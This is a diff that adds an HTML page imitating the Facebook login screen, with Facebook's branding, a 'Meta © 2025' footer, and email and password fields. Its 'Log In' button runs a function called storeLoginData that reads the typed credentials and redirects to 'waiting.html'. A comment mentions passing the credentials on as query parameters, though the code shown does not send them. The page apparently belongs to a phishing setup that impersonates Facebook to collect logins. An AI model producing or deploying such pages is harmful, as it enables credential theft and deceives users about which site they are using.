@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      flex-direction: column;
+    }
+
+    .login-container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      width: 260px; /* Reduced width for smaller input boxes */
+      text-align: center;
+    }
+
+    .login-container h2 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #1877f2;
+    }
+
+    .input-field {
+      width: 90%; /* Ensures input fields take full width */
+      padding: 15px; /* Adjust padding */
+      margin-bottom: 10px;
+      border: 1px solid #dddfe2;
+      border-radius: 5px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .input-field:focus {
+      outline: none;
+      border-color: #1877f2;
+    }
+
+    .eye-icon-container {
+      position: relative;
+      width: 100%;
+    }
+
+    .eye-icon-container img {
+      position: absolute;
+      right: 10px;
+      top: 40%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      width: 25px; /* Adjust size of the image */
+    }
+
+    .login-btn {
+      width: 100%; /* Ensure button takes full width */
+      padding: 12px;
+      background-color: #1877f2;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-btn:hover {
+      background-color: #1877f2;
+    }
+
+    .forgot-password {
+      font-size: 12px;
+      color: #1877f2;
+      text-decoration: none;
+      margin-top: 10px;
+      display: block;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      margin: 20px 0;
+      width: 100%; /* Make the divider span the full width */
+      border-bottom: 1px solid #dddfe2;
+      position: relative;
+    }
+
+    .divider span {
+      position: absolute;
+      top: -8px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #fff;
+      padding: 0 10px;
+      font-size: 14px;
+      color: #888;
+    }
+
+    /* Footer styling */
+    .footer {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #888;
+    }
+
+    .footer a {
+      text-decoration: none;
+      color: #888;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <h2>Facebook</h2>
+    <input type="text" class="input-field" placeholder="Email or Phone Number" id="email" required>
+    <div class="eye-icon-container">
+      <input type="password" class="input-field" placeholder="Password" id="password" required>
+      <img src="not.png" id="eye-icon" onclick="togglePasswordVisibility()" alt="Eye Icon">
+    </div>
+    <button class="login-btn" onclick="storeLoginData()">Log In</button>
+    
+    <a href="#" class="forgot-password">Forgot password?</a>
+    
+    <div class="divider">
+      <span>or</span>
+    </div>
+    
+    <button class="login-btn" style="background-color: #1877f2;">Create New Account</button>
+  </div>
+
+  <br>  
+  <br>
+  <br>
+
+  <!-- Footer section -->
+  <div class="footer">
+    <a href="meta.html">Meta © 2025</a>
+  </div>
+
+  <script>
+    function togglePasswordVisibility() {
+      const passwordField = document.getElementById('password');
+      const eyeIcon = document.getElementById('eye-icon');
+      
+      // Toggle password visibility
+      if (passwordField.type === 'password') {
+        passwordField.type = 'text';
+        eyeIcon.src = 'visi.png';  // Replace with the path to your closed eye icon image
+      } else {
+        passwordField.type = 'password';
+        eyeIcon.src = 'not.png';  // Replace with the path to your open eye icon image
+      }
+    }
+
+    function storeLoginData() {
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // Redirect to meta.html with the email and password as query parameters
+      window.location.href = 'waiting.html';
+    }
+  </script>
+
+</body>
+</html>
